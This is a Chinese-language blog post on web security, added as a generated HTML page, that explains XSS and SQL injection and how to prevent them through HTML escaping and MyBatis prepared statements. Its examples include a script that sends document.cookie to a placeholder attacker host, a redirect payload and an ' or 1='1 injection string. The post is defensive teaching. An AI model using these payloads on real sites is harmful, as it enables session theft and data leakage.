@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"coderchenming.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="目的1.避免代码被攻击 2.如何做到项目安全保障  项目安全隐患">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss和sql注入">
+<meta property="og:url" content="http://coderchenming.github.io/2020/01/08/xss%E5%92%8Csql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="CoderChen&#39;s Blog">
+<meta property="og:description" content="目的1.避免代码被攻击 2.如何做到项目安全保障  项目安全隐患">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://coderchenming.github.io/images/security/common.png">
+<meta property="article:published_time" content="2020-01-08T13:46:29.000Z">
+<meta property="article:modified_time" content="2020-01-08T14:16:21.000Z">
+<meta property="article:author" content="CoderChen">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://coderchenming.github.io/images/security/common.png">
+
+<link rel="canonical" href="http://coderchenming.github.io/2020/01/08/xss%E5%92%8Csql%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss和sql注入 | CoderChen's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="CoderChen's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoderChen's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">留心处处皆学问，人情练达即文章</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://coderchenming.github.io/2020/01/08/xss%E5%92%8Csql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoderChen">
+      <meta itemprop="description" content="脚踏实地，积少成多，集腋成裘">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoderChen's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss和sql注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-08 13:46:29 / 修改时间：14:16:21" itemprop="dateCreated datePublished" datetime="2020-01-08T13:46:29Z">2020-01-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">架构设计</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><pre><code>1.避免代码被攻击
+2.如何做到项目安全保障
+</code></pre>
+<h2 id="项目安全隐患"><a href="#项目安全隐患" class="headerlink" title="项目安全隐患"></a>项目安全隐患</h2><pre><code>1.代码
+2.业务逻辑
+3.应用
+</code></pre>
+<h2 id="web安全常用攻击手段"><a href="#web安全常用攻击手段" class="headerlink" title="web安全常用攻击手段"></a>web安全常用攻击手段</h2><pre><code>xss
+sql注入
+防盗链
+</code></pre>
+<h2 id="什么是XSS攻击"><a href="#什么是XSS攻击" class="headerlink" title="什么是XSS攻击?"></a>什么是XSS攻击?</h2><pre><code>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。
+攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。
+利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
+为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。
+
+XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；
+浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。
+</code></pre>
+<h2 id="常见的XSS危害举例"><a href="#常见的XSS危害举例" class="headerlink" title="常见的XSS危害举例"></a>常见的XSS危害举例</h2><pre><code>1.盗取cookie,通过cookie信息伪造请求
+   &lt;script&gt;
+    // 通过动态构造一个img标签，将当前页面的cookie发送给attack.com
+    new Image().src = &quot;http://attacker.ip/&quot; + document.cookie;
+   &lt;/script&gt;
+2.钓鱼
+eg: 在一个页面提交表单后，到另一个页面展示，可能会受到XSS脚本注入，读取本地cookie远程发送给黑客服务器端。
+eg: 链接中包含用户信息，被第三方拦截，添加js脚本，跳转到钓鱼网站的转账页面，用户未能识别钓鱼网站而被骗
+例如:某wx群分享了一个连接,点击这个连接，打开后的网址和某宝极其相似,比如类似这种www.taoobao.com
+你如果没有区分出网址的错误,而在打开的连接中输入转账信息的表单,这个页面带着你的转账信息+&lt;js跳转转账网址&gt;
+又调到了转账页面,一点击转账,凉了...
+测试脚本:
+&lt;script&gt;alert(&#39;sss&#39;)&lt;/script&gt;
+eg: 比如论坛或者贴吧的评论区,如果不对xss攻击进行处理,比如类似如下这种
+&lt;script&gt;window.location.href=&#39;http://www.baidu.com&#39;;&lt;/script&gt;
+那么当普通用户进入评论页,会自动跳转到www.baidu.com,自己的网站被别人引流了,惨不惨!!
+</code></pre>
+<h2 id="如何防御XSS攻击"><a href="#如何防御XSS攻击" class="headerlink" title="如何防御XSS攻击?"></a>如何防御XSS攻击?</h2><pre><code>将脚本特殊字符，转换成html源代码进行展示。比如&#39;&lt;&#39; 在html想展示符号内容而不是被浏览器解析,需要转为&amp;lt;
+测试脚本处理后对应html源代码: &amp;lt;script&amp;gt;alert(&#39;sss&#39;)&amp;lt;/script&amp;gt;
+项目一般处理方式:写一个过滤器,拦截所有请求,将参数中的特殊字符进行过滤处理
+ 可以借助commons包下工具类,完成特殊字符转换
+ &lt;dependency&gt;
+    &lt;groupId&gt;commons-lang&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-lang&lt;/artifactId&gt;
+    &lt;version&gt;2.6&lt;/version&gt;
+  &lt;/dependency&gt;
+  
+</code></pre>
+<p>   <img src="/images/security/common.png"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre><code>根据sql语法,输入相关字符,改变原sql形成攻击sql
+如:mybatis 中$符号拼接sql时需要程序员添加&#39;,这里当攻击者通过&#39;的技巧输入形成新sql,从而直接对MYSQL进行数据攻击
+eg: select username,password from user where user=&#39;$&#123;username&#125;&#39; and password=&#39;$&#123;password&#125;&#39;;
+当攻击url: http://ip:port/find?username=zhangsan&amp;password=&#39;or 1= &#39;1
+形成攻击sql:select username,password from user where user=&#39;zhangsan&#39; and password=&#39;&#39; or 1 =&#39;1&#39;;
+后果: 可完成查询所有用户数据,用户数据泄露
+</code></pre>
+<h2 id="如何防御sql攻击"><a href="#如何防御sql攻击" class="headerlink" title="如何防御sql攻击"></a>如何防御sql攻击</h2><pre><code>1.编写dao层尽量不要使用sql拼接,使用预编译方式,比如mybatis中的#替换$
+2.如果使用了sql拼接,要对入参含有特殊字符进行处理
+</code></pre>
+<h2 id="MyBatis-与-区别"><a href="#MyBatis-与-区别" class="headerlink" title="MyBatis #与$区别"></a>MyBatis #与$区别</h2><pre><code>#&#123;&#125;: 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个 #&#123;&#125; 被解析为一个参数占位符,可以防止SQL注入问题。
+$&#123;&#125;: 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换。
+</code></pre>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/10/%E7%BB%9F%E4%B8%80%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/" rel="prev" title="统一异常处理方案">
+      <i class="fa fa-chevron-left"></i> 统一异常处理方案
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/16/%E9%98%B2%E7%9B%97%E9%93%BE%E6%8A%80%E6%9C%AF/" rel="next" title="防盗链技术">
+      防盗链技术 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="nav-number">2.</span> <span class="nav-text">项目安全隐患</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%AE%89%E5%85%A8%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-number">3.</span> <span class="nav-text">web安全常用攻击手段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXSS%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">什么是XSS攻击?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84XSS%E5%8D%B1%E5%AE%B3%E4%B8%BE%E4%BE%8B"><span class="nav-number">5.</span> <span class="nav-text">常见的XSS危害举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1XSS%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">如何防御XSS攻击?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1sql%E6%94%BB%E5%87%BB"><span class="nav-number">8.</span> <span class="nav-text">如何防御sql攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MyBatis-%E4%B8%8E-%E5%8C%BA%E5%88%AB"><span class="nav-number">9.</span> <span class="nav-text">MyBatis #与$区别</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoderChen</p>
+  <div class="site-description" itemprop="description">脚踏实地，积少成多，集腋成裘</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoderChen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">31k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">28 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
